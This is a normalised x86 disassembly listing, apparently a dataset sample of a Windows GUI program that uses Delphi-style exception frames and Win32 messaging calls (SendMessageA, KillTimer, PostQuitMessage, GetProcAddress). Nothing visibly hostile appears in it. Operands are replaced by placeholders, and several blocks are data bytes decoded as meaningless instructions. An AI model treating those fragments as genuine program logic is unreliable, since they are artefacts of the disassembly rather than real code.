mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_3acca50
mov eax [ eax + 0x54 ]
call sub_3a7a33c
retn
sub_3acca5c
mov eax [ eax + 0x54 ]
call sub_3a7a630
retn
sub_3acccfb
jmp sub_3a64b54
sub_3accd3f
jmp sub_3a64b54
sub_3accd46
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3accd94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3accb94
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3acce00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_3a7a494
pop esi
pop ebx
retn
sub_3acce14
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_3acd027
jmp sub_3a64b54
sub_3acd02e
pop ebx
mov esp ebp
pop ebp
retn
sub_3acd034
inc [ eax + 0x8c ]
retn
sub_3acd03c
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_3acd05c
sub_3acd05c
xor edx edx
call sub_3acd4d8
retn
sub_3acd4ca
jmp sub_3a64b54
sub_3acd551
jmp sub_3a64b54
sub_3acd560
add eax 0x30
call sub_3a6efbc
retn
sub_3acd5a4
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x8d ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_3acd5f5
jmp sub_3a648a0
sub_3acd5fa
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3acd878
call sub_3acd840
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_3ac7f10
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_3acde19
jmp sub_3a64b54
sub_3acde20
pop ebx
mov esp ebp
pop ebp
retn
sub_3acdfa4
push ebx
inc [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0x10a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_3acdfd0
push ebx
dec [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_3acdffc
xor edx edx
call sub_3acdf00
retn
sub_3ace004
mov dl 0x1
call sub_3acdf00
retn
sub_3ace31c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_3ace334
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_3ace425
jmp sub_3a64b54
sub_3ace42c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aceb5e
jmp sub_3a648a0
sub_3acf2b0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acf19c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_3acf3c4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_3acf457
jmp sub_3a648a0
sub_3acf503
jmp sub_3a64b54
sub_3acf50a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acf5d6
jmp sub_3a648a0
sub_3acf60f
jmp sub_3a64b54
sub_3acf616
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3acf61c
call sub_3a6eae0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_3acf884
jmp sub_3a64b54
sub_3acf88b
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3acf953
jmp sub_3a64b54
sub_3acf95a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3acfbe2
jmp sub_3a64b54
sub_3acfbe9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acfc6b
jmp sub_3a64b54
sub_3acfc72
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acfc7c
call sub_3acf970
retn
sub_3acfc84
push ebx
mov ebx edx
mov edx ebx
xor eax eax
call sub_3a63350
pop ebx
retn
sub_3acfdb1
jmp sub_3a648a0
sub_3acfdb6
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3acfec8
jmp sub_3a648a0
sub_3acff21
jmp sub_3a64b54
sub_3acff28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad0051
jmp sub_3a64b54
sub_3ad0180
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4c ] 0x0
setne al
pop ebx
retn
lea eax [ ebx + 0x4c ]
call sub_3a66cb4
call sub_3a85250
sub_3ad01e4
push ebx
mov ebx eax
movzx eax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_3ad0525
jmp sub_3a64b54
sub_3ad0554
jmp sub_3a64b54
sub_3ad0666
jmp sub_3a64b54
sub_3ad066d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ad0a06
jmp sub_3a64b54
sub_3ad0a0d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad0c88
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_3ad0cd3
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_3ad0ce4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_3ad0cf4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_3ad0ef4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
mov edx [ eax + 0x18 ]
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ad0f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
movzx edx [ eax + 0x8 ]
mov eax esi
call sub_3a80ad8
pop esi
pop ebx
retn
sub_3ad0f2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
mov edx [ eax + 0xc ]
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ad0f48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
mov edx [ eax + 0x14 ]
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ad0f64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
movzx edx [ eax + 0x28 ]
mov eax esi
call sub_3a80ad8
pop esi
pop ebx
retn
sub_3ad0f80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ad0d70
mov edx [ eax + 0x10 ]
mov eax esi
call sub_3a81354
pop esi
pop ebx
retn
sub_3ad1048
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_3ad1240
movzx eax [ rw-data ]
retn
sub_3ad12ac
movzx eax [ rw-data ]
retn
sub_3ad12b4
add [ eax ] eax
add [ eax ] al
hlt
sub_3ad1330
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_3a64380
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_3ad134c
or al [ eax ]
add [ eax ] al
pushad
0x3af
sub_3ad1354
dec esp
sbb [ eax + 0x3 ] dh
add [ edx + ecx * 8 - 0x51 ] bl
add ebp esp
push ss
mov al 0x3
add [ eax ] al
add [ eax ] al
pop eax
0x3af
sub_3ad136c
cwde
push ss
mov al 0x3
add [ eax ] al
add [ eax ] al
push esp
0x3af
sub_3ad1378
mov [ edi ] dl
mov al 0x3
add [ eax ] al
add [ eax ] al
push eax
0x3af
sub_3ad1384
mov [ eax ] ds
mov al 0x3
add [ eax ] al
add [ eax ] al
dec esp
0x3af
sub_3ad1390
add al 0x1b
mov al 0x3
add [ eax ] al
add [ eax ] al
dec eax
0x3af
sub_3ad139d
sbb [ eax + 0x3 ] dh
add [ edx + ecx * 8 - 0x51 ] al
add edi [ eax + 0x19 ]
mov al 0x3
add [ eax ] al
add [ eax ] al
inc eax
0x3af
sub_3ad13f4
jmp sub_3a64b54
sub_3ad13fb
pop ebp
retn
sub_3ad143c
jmp sub_3a64b54
sub_3ad1443
pop ebp
retn
sub_3ad14d5
jmp sub_3a64b54
sub_3ad14dc
pop ebp
retn
sub_3ad1524
jmp sub_3a64b54
sub_3ad152b
pop ebp
retn
sub_3ad1544
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xe003ad15
adc eax 0x3ad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0xad15
sub_3ad26f3
jmp sub_3a64b54
sub_3ad2700
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_3ad277c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_3a652f4
mov eax ebx
call sub_3ad2700
pop esi
pop ebx
retn
sub_3ad2798
mov [ eax + 0x14 ] edx
call sub_3ad2700
retn
sub_3ad27a4
mov [ eax + 0x18 ] edx
call sub_3ad2700
retn
sub_3ad27dc
push ebx
mov ebx eax
mov eax ebx
call sub_3a7b0ac
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_3ad29c8
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_3ad27b0
call sub_3ad27ec
sub_3ad29e0
mov edx sub_3ad27b0
call sub_3ad27ec
retn
sub_3ad2ba5
jmp sub_3a64b54
sub_3ad2be0
push ebx
mov ebx ecx
mov eax ebx
call sub_3a652a0
pop ebx
retn
sub_3ad2bec
mov al 0x1
retn
sub_3ad2cf5
jmp sub_3a64b54
sub_3ad2df0
retn
sub_3ad2f13
jmp sub_3a64b54
sub_3ad2f1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad3264
mov eax [ eax + 0xd0 ]
call sub_3a7b21c
retn
sub_3ad32d4
mov eax [ r-xdata ]
retn
sub_3ad3300
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3ad3334
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
pop ebx
retn
sub_3ad3424
retn
sub_3ad356b
jmp sub_3a64b54
sub_3ad3572
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad357c
retn
sub_3ad359f
jmp sub_3a64b54
sub_3ad35a6
pop ebp
retn 0x4
sub_3ad5ff8
in al dx
[ ebp - 0x54005301 ]
sub_3ad627c
sbb ch ch
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
int3
sub_3ad83e0
cmp dl [ eax + 0x16 ]
je r-xdata
retn
mov [ eax + 0x16 ] dl
mov [ eax + 0x17 ] 0x0
xor edx edx
call sub_3a7ae98
sub_3ad83f4
movzx eax [ eax + 0x17 ]
xor al 0x1
retn
sub_3ad83fc
cmp dl [ eax + 0x17 ]
je r-xdata
retn
mov [ eax + 0x17 ] dl
call sub_3ad840c
sub_3ad8448
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x16 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_3ad849c
cmp dl [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] dl
xor edx edx
call sub_3a7ae98
sub_3ad84ac
cmp dl [ eax + 0x15 ]
je r-xdata
retn
mov [ eax + 0x15 ] dl
xor edx edx
call sub_3a7ae98
sub_3ad84bc
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_3a7ae98
sub_3ad8564
push ebx
mov ebx eax
mov eax ebx
call sub_3a7b0ac
pop ebx
retn
sub_3ad8584
mov eax [ eax + 0x18 ]
retn
sub_3ad880c
push esi
mov esi eax
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3ad8b22
jmp sub_3a64b54
sub_3ad8b88
cmp dl [ eax + 0x25d ]
je r-xdata
retn
mov [ eax + 0x25d ] dl
mov dl 0x1
call sub_3ad9184
sub_3ad8d33
jmp sub_3a64b54
sub_3ad8d3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad8f96
jmp sub_3a64b54
sub_3ad8f9d
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_3ad8fac
mov eax [ eax + 0x258 ]
test eax eax
je r-xdata
mov [ edx + 0xc ] eax
retn
sub eax 0x4
mov eax [ eax ]
sub_3ad9004
cmp [ eax + 0x25f ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x59 ] 0x0
jne r-xdata
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_3ad9050
push ebx
mov ebx eax
mov eax ebx
call sub_3ab713c
mov eax ebx
call sub_3ab4518
pop ebx
retn
sub_3ad9064
push ebx
mov ebx eax
mov eax ebx
call sub_3ab1eec
cmp [ ebx + 0x25f ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov [ ebx + 0x25f ] 0x0
sub_3ad9108
push ebx
mov ebx eax
mov eax ebx
call sub_3ab72a0
mov eax ebx
call sub_3ab4518
pop ebx
retn
sub_3ad911c
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7348
mov eax ebx
call sub_3ad8ba0
pop ebx
retn
sub_3ad9130
push ebx
mov ebx ecx
cmp [ eax + 0x25f ] 0x0
je r-xdata
mov ecx ebx
call sub_3ab7738
pop ebx
retn
movzx ecx [ r-xdata ]
mov [ eax + 0x8c ] cl
sub_3ad917c
call sub_3ab91e8
retn
sub_3ad9250
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ad8504
retn
sub_3ad9260
mov eax [ r-xdata ]
retn
sub_3ad9470
push ebx
mov ebx eax
mov eax ebx
call sub_3ad94fc
mov [ ebx + 0x25c ] eax
mov eax ebx
call sub_3ab4248
pop ebx
retn
sub_3ad9681
jmp sub_3a64b54
sub_3ad9688
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ad9690
mov ecx [ eax + 0x258 ]
call sub_3ad954c
retn
sub_3ad969c
mov ecx edx
mov edx [ eax + 0x254 ]
call sub_3ad954c
retn
sub_3ad9734
cmp dl [ eax + 0x264 ]
je r-xdata
retn
mov [ eax + 0x264 ] dl
call sub_3ab4518
sub_3ad9748
cmp dl [ eax + 0x265 ]
je r-xdata
retn
mov [ eax + 0x265 ] dl
call sub_3ab4518
sub_3ad975c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_3ad9770
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_3ad9a22
jmp sub_3a64b54
sub_3ad9b64
jmp sub_3a64b54
sub_3ad9b6b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ad9c14
movzx eax [ eax + 0xd ]
xor al 0x1
retn
sub_3ad9cb4
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_3ad9a38
sub_3ad9cc4
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_3a7ae98
sub_3ad9cd4
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_3a7ae98
sub_3ad9dd8
mov eax [ eax + 0x18 ]
retn
sub_3ad9ef8
jmp sub_3a64b54
sub_3ad9f4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3ada067
jmp sub_3a64b54
sub_3ada06e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ada166
cmpsd [ esi ] [ edi ]
add edx eax
0x3a7
sub_3ada26c
push ebx
mov ebx eax
mov eax ebx
call sub_3a7c5c8
mov eax [ ebx + 0x3c ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_3ada2a4
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x4 ]
call sub_3adabc0
retn
sub_3ada37c
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x4 ]
call sub_3adacf8
retn
sub_3ada388
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x3c ]
call sub_3a7a494
pop esi
pop ebx
retn
sub_3ada39c
mov eax [ eax + 0x3c ]
call sub_3a7a5e0
retn
sub_3ada47c
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3ada474
cmp ebx [ eax + 0x2dc ]
je r-xdata
mov eax ebx
call sub_3a64380
sub_3ada9e4
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_3ada9f8
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x290 ] 0x0
je r-xdata
xchg edx eax
call sub_3adac58
retn
mov eax [ eax + 0x18 ]
retn
sub_3adaa44
mov eax [ eax + 0x8 ]
call sub_3ada388
retn
sub_3adac58
add esp 0xffffffe8
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
call sub_3adabc0
mov edx esp
push edx
push 0xffffffff
push 0x100d
push eax
call __imp_SendMessageA
add esp 0x18
retn
sub_3adace0
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_3adacf8
sub_3adae7e
jmp sub_3a64b54
sub_3adaec4
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_3adacf8
sub_3adb20a
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
sub_3adb216
jmp sub_3a64b54
j_sub_3adb20a
jmp sub_3adb20a
sub_3adb21d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adb23f
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_3a652c4
retn
sub_3adb238
jmp sub_3a64b54
sub_3adb23f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adb431
jmp sub_3a64b54
sub_3adb438
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adb706
jmp sub_3a64b54
sub_3adb70d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adb714
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3adabcc
call sub_3ada47c
pop esi
pop ebx
retn
sub_3adb72c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_3adb7c4
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_3ab4518
sub_3adb7d8
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_3ab4518
sub_3adb7ec
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_3ab4518
sub_3adbc86
add [ eax ] al
sub_3adbd10
jmp sub_3a64b54
sub_3adbeae
jmp sub_3a64b54
sub_3adc28b
jmp sub_3a64b54
sub_3adc292
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adc2b5
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a665dc
retn
sub_3adc2ae
jmp sub_3a64b54
sub_3adc2b5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3adc334
jmp sub_3a64b54
sub_3adc33b
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_3adc4a7
jmp sub_3a64b54
sub_3adc4e9
jmp sub_3a648a0
sub_3adc4ee
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adc584
jmp sub_3a64b54
sub_3adc58b
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_3adc710
jmp sub_3a64b54
sub_3adc752
jmp sub_3a648a0
sub_3adc757
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adca4c
cmp dl [ eax + 0x2c3 ]
je r-xdata
retn
mov [ eax + 0x2c3 ] dl
call sub_3adc794
sub_3adca60
cmp dl [ eax + 0x2c4 ]
je r-xdata
retn
mov [ eax + 0x2c4 ] dl
call sub_3adc794
sub_3adcac8
cmp dl [ eax + 0x291 ]
je r-xdata
retn
mov [ eax + 0x291 ] dl
call sub_3ab4518
sub_3adcadc
cmp dl [ eax + 0x2c6 ]
je r-xdata
retn
mov [ eax + 0x2c6 ] dl
call sub_3adc794
sub_3adcaf0
cmp dl [ eax + 0x2c1 ]
je r-xdata
retn
mov [ eax + 0x2c1 ] dl
call sub_3adc794
sub_3adcb04
cmp dl [ eax + 0x2c2 ]
je r-xdata
retn
mov [ eax + 0x2c2 ] dl
call sub_3adc794
sub_3adcb18
cmp dl [ eax + 0x25c ]
je r-xdata
retn
mov [ eax + 0x25c ] dl
call sub_3ab4518
sub_3adcb2c
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_3ab4518
sub_3adcb88
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_3ab4518
sub_3adcb9c
cmp dl [ eax + 0x277 ]
je r-xdata
retn
mov [ eax + 0x277 ] dl
call sub_3ab4518
sub_3adcec7
jmp sub_3a64b54
sub_3adcece
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adceec
cmp [ eax + 0x25d ] 0x3
sete al
retn
sub_3adcef8
cmp [ eax + 0x2b0 ] 0x0
setne al
retn
sub_3adcf44
cmp dl [ eax + 0x284 ]
je r-xdata
retn
mov [ eax + 0x284 ] dl
call sub_3ab4518
sub_3adcf58
cmp dl [ eax + 0x25e ]
je r-xdata
retn
mov [ eax + 0x25e ] dl
call sub_3ab4518
sub_3add1a8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3adaac4
retn
sub_3add326
jmp sub_3a64b54
sub_3add32d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3add338
call sub_3ab7c38
push 0x0
push 0x0
push 0x1032
push eax
call __imp_SendMessageA
retn
sub_3add637
jmp sub_3a64b54
sub_3adda25
jmp sub_3a64b54
sub_3addb99
jmp sub_3a64b54
sub_3addce5
jmp sub_3a64b54
sub_3ade1d6
jmp sub_3a64b54
sub_3ade1dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ade258
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
sub_3ade2a8
push ebx
cmp [ eax + 0x3b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3b4 ]
call [ ebx + 0x3b0 ]
sub_3ade321
jmp sub_3a64b54
sub_3ade328
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ade485
jmp sub_3a64b54
sub_3ade48c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ade800
mov eax [ eax + 0x278 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3ade80c
push esi
mov esi eax
mov eax [ esi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3adea98
mov eax [ eax + 0x288 ]
call sub_3ad9dc0
retn
sub_3adeb3c
jmp sub_3a64b54
sub_3adeb43
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3adec3c
push ebx
cmp [ eax + 0x39a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x39c ]
call [ ebx + 0x398 ]
sub_3adf2c7
jmp sub_3a64b54
sub_3adf2e4
jmp sub_3a64b54
sub_3adf2eb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adf441
jmp sub_3a64b54
sub_3adf448
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adf458
mov [ eax + 0x2da ] 0x1
retn
sub_3adf8cb
jmp sub_3a64b54
sub_3adf8d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adf904
mov [ eax + 0x2e4 ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_3adfa2d
jmp sub_3a64b54
sub_3adfa34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3adfa3c
push ebx
cmp [ eax + 0x3aa ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3ac ]
call [ ebx + 0x3a8 ]
sub_3adfde5
jmp sub_3a64b54
sub_3adfdec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3adfdf4
mov eax [ eax + 0x278 ]
call sub_3adab94
retn
sub_3adfe89
jmp sub_3a64b54
sub_3adfe90
pop ecx
pop ebp
retn
sub_3adfe94
mov eax [ r-xdata ]
retn
sub_3ae0020
push ebx
mov ebx eax
mov eax ebx
call sub_3a7afdc
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_3ae008c
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_3ae00a8
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_3ae00c4
push ebx
mov ebx eax
mov eax ebx
call sub_3ad27dc
pop ebx
retn
sub_3ae0138
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ad29b4
pop esi
pop ebx
retn
sub_3ae02dd
add [ esp + 0x4 ] 0xffffffec
jmp sub_3ae1644
sub_3ae02e7
add [ esp + 0x4 ] 0xffffffec
jmp sub_3ae1730
sub_3ae02f1
add [ esp + 0x4 ] 0xffffffec
jmp sub_3ae171c
sub_3ae02fb
add [ esp + 0x4 ] 0xffffffec
jmp sub_3ae1594
sub_3ae030f
add [ esp + 0x4 ] 0xffffffec
jmp sub_3a66d88
sub_3ae0319
add [ esp + 0x4 ] 0xffffffec
jmp sub_3a66d9c
sub_3ae08b0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x2bc ]
push eax
mov ecx [ esi + 0x2b8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x104 ]
pop esi
pop ebx
retn
sub_3ae0afc
jmp sub_3a64b54
sub_3ae0bf9
jmp sub_3a64b54
sub_3ae0c00
pop esi
